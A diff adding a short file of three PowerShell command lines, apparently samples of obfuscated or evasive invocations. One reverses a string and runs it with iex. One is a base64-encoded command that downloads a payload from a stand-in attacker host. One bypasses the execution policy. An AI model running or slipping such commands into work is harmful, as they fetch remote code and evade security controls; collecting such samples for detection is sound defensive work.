@@ -1,0 +1,3 @@
+powershell.exe -Command "$s = 'tpircS'; $rev = [char[]]$s; [array]::Reverse($rev); iex (-join $rev)"
+powershell.exe -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAIgBoAHQAdABwADoALwAvAGEAdAB0AGEAYwBrAGUAcgAuAGMAbwBtAC8AcABhAHkAbABvAGEAZAAiAA==
+powershell.exe -ExecutionPolicy Bypass -File script.ps1
